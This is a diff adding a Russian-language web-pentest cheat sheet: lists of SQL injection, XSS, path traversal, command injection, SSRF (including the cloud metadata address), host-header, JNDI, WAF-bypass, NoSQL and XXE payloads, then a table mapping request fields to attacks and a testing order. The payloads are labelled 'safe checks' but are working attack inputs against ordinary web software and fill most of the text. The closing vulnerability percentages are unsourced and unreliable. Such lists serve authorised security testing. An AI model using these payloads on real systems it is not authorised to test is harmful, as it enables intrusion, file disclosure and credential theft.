@@ -675,3 +675,316 @@ text
 ```
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#  PAY_LOAD_s SQLi простые общие примеры....
+
+```txt
+
+# =============================================
+# БАЗОВЫЕ СИНТАКСИЧЕСКИЕ ТЕСТЫ (САМЫЕ БЕЗОПАСНЫЕ)
+# =============================================
+'
+"
+`
+;
+--
+-- 
+# 
+/* 
+*/ 
+')
+")
+'))
+\\
+
+# =============================================
+# SQL INJECTION (ERROR-BASED, БЕЗ ИЗМЕНЕНИЯ ДАННЫХ)
+# =============================================
+' AND '1'='1
+' AND '1'='2
+" AND "1"="1
+" AND "1"="2
+1 AND 1=1
+1 AND 1=2
+' OR '1'='1
+' OR '1'='2
+' AND 1=CAST('test' AS INT)--
+' OR (SELECT 1/0)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+' AND 1=(SELECT COUNT(*) FROM tabname)--
+' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--
+
+# =============================================
+# UNION-BASED SQLi (БЕЗОПАСНЫЕ ПРОВЕРКИ)
+# =============================================
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,'test',NULL--
+' UNION SELECT @@version,NULL--
+' UNION SELECT version(),NULL--
+' UNION SELECT user(),NULL--
+' UNION SELECT database(),NULL--
+
+# =============================================
+# TIME-BASED SQLi (МИНИМАЛЬНЫЕ ЗАДЕРЖКИ)
+# =============================================
+' AND SLEEP(1)--
+' OR SLEEP(1)--
+' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--
+';SELECT SLEEP(1)--
+' AND BENCHMARK(100000,MD5('test'))--
+' WAITFOR DELAY '0:0:1'--
+' AND pg_sleep(1)--
+
+# =============================================
+# XSS (БЕЗОПАСНЫЕ ПРОВЕРКИ, НЕ ВОРУЮТ ДАННЫЕ)
+# =============================================
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+javascript:alert(1)
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<a href="javascript:alert(1)">click</a>
+
+# =============================================
+# PATH TRAVERSAL / LFI (ТОЛЬКО ПРОВЕРКИ)
+# =============================================
+../../../etc/passwd
+..\..\..\windows\win.ini
+....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+/etc/passwd
+c:\windows\win.ini
+.../.../.../etc/passwd
+
+# =============================================
+# COMMAND INJECTION (БЕЗОПАСНЫЕ КОМАНДЫ)
+# =============================================
+;echo test
+|echo test
+&echo test
+`echo test`
+$(echo test)
+||echo test
+&&echo test
+;id
+|id
+&id
+`id`
+$(id)
+;whoami
+|whoami
+
+# =============================================
+# SSRF (БЕЗОПАСНЫЕ АДРЕСА, ТОЛЬКО ПРОВЕРКА)
+# =============================================
+http://169.254.169.254/latest/meta-data/
+http://localhost:80
+http://127.0.0.1:80
+http://[::1]:80
+http://0.0.0.0:80
+file:///etc/passwd
+gopher://localhost:80
+dict://localhost:80
+
+# =============================================
+# HOST HEADER INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
+# =============================================
+evil.com
+example.com:80@evil.com
+example.com\r\nInjected-Header: test
+localhost
+127.0.0.1
+169.254.169.254
+example.com.bad.com
+-example.com
+
+# =============================================
+# COOKIE INJECTION (БЕЗОПАСНЫЕ ПРОВЕРКИ)
+# =============================================
+' OR '1'='1
+" OR "1"="1
+admin
+true
+1
+../etc/passwd
+..././..././etc/passwd
+${jndi:ldap://test}
+
+# =============================================
+# USER-AGENT INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
+# =============================================
+Mozilla/5.0 ' OR '1'='1
+Mozilla/5.0 <script>alert(1)</script>
+() { :; }; echo test
+Mozilla/5.0\" OR \"1\"=\"1
+
+# =============================================
+# REFERER INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
+# =============================================
+https://evil.com
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+http://localhost
+http://127.0.0.1
+example.com@evil.com
+
+# =============================================
+# CONTENT-TYPE MANIPULATION (БЕЗОПАСНЫЕ ТЕСТЫ)
+# =============================================
+application/json
+text/xml
+multipart/form-data; boundary=test
+text/html"><script>alert(1)</script>
+application/x-www-form-urlencoded' OR '1'='1
+
+# =============================================
+# WAF BYPASS (БЕЗОПАСНЫЕ ОБХОДЫ)
+# =============================================
+%27
+%2527
+%bf%27
+%2D%2D
+%23
+SEL%0bECT
+UNI%0dON
+'/**/OR/**/1=1--
+'%0aOR%0a'1'='1
+' AND 1 LIKE 1--
+1' and@'1'='1
+'%20OR%20'1'='1
+
+# =============================================
+# JSON INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
+# =============================================
+{"id":"1'"}
+{"id":"1' OR '1'='1"}
+{"id":"1\" OR \"1\"=\"1"}
+{"id":{"$ne":1}}
+{"id":{"$regex":".*"}}
+
+# =============================================
+# XXE (БЕЗОПАСНЫЕ ПРОВЕРКИ)
+# =============================================
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
+
+# =============================================
+# NO-SQL INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
+# =============================================
+{"$ne": null}
+{"$ne": 1}
+{"$regex": ".*"}
+{"$where": "1==1"}
+' || '1'=='1
+' || 1==1
+' && 1==1
+
+
+
+
+
+```
+## **ТАБЛИЦА: КАЖДАЯ СТРОЧКА → ВОЗМОЖНЫЕ АТАКИ**
+
+|  Строка запроса  |  Основные атаки  |     Пример payload    |   Риск  | 
+
+
+
+|**URL параметры** (`id=1`)|SQLi, XSS, Path traversal, Command injection, SSRF|`1' OR '1'='1`, `../../../etc/passwd`|ВЫСОКИЙ|
+
+
+|**Host header**|Host injection, Cache poisoning, SSRF|`evil.com`, `localhost`|СРЕДНИЙ|
+
+|**User-Agent**|XSS, Log injection, Command injection|`<script>alert(1)</script>`|НИЗКИЙ|
+
+|**Cookies**|Session hijacking, SQLi, Path traversal|`' OR '1'='1`, `../etc/passwd`|ВЫСОКИЙ|
+
+|**Accept header**|Content-type manipulation, XSS|`text/html"><script>`|НИЗКИЙ|
+
+|**Referer**|Open redirect, Referer-based auth bypass|`javascript:alert(1)`|СРЕДНИЙ|
+
+|**Content-Type**|Content-type confusion, XSS|`application/json`|НИЗКИЙ|
+
+|**Тело запроса**|ВСЁ выше + NoSQLi, XXE|`admin'--`, `{$ne: null}`|
+
+
+
+### **ВО ВСЕ ТЕКСТОВЫЕ ПОЛЯ можно:**
+
+1. **SQLi тесты** (`'`, `"`, `' OR '1'='1`)
+    
+2. **XSS тесты** (`<script>alert(1)</script>`)
+    
+3. **Path traversal** (`../../../etc/passwd`)
+    
+
+### **📌 ТОЛЬКО В URL/Теле запроса:**
+
+- **Command injection** (`;id`, `|whoami`)
+    
+- **SSRF** (`http://169.254.169.254/`)
+    
+
+### **📌 ТОЛЬКО В ЗАГОЛОВКАХ:**
+
+- **Host header attacks** (подмена хоста)
+    
+- **Cache poisoning** (через X-Forwarded-Host)
+    
+
+### **📌 ТОЛЬКО В СПЕЦИФИЧНЫХ ПОЛЯХ:**
+
+- **NoSQLi** → только если backend использует MongoDB
+    
+- **XXE** → только если парсится XML
+    
+- **JSONi** → только если `Content-Type: application/json`
+    
+
+## 🔧 **КАК ТЕСТИРОВАТЬ СИСТЕМАТИЧНО:**
+
+1. **Начните с параметров URL** — там чаще всего уязвимости
+    
+2. **Потом тело запроса** (если POST)
+    
+3. **Затем Cookies** — часто забывают валидировать
+    
+4. **Потом заголовки** (Host, User-Agent, Referer)
+    
+5. **В конце специфичные тесты** (NoSQLi, XXE, JSONi)
+    
+
+## ⚠️ **ВАЖНОЕ ПРАВИЛО:**
+
+**Если поле принимает ввод пользователя → оно потенциально уязвимо.**  
+Разница только в **вероятности** и **последствиях**:
+
+- **Параметры URL**: 90% SQLi/XSS находят здесь
+    
+- **Cookies**: 70% уязвимостей контроля доступа
+    
+- **Заголовки**: 30% обходов WAF/фильтров
+    
+- **Тело запроса**: 50% уязвимостей в API
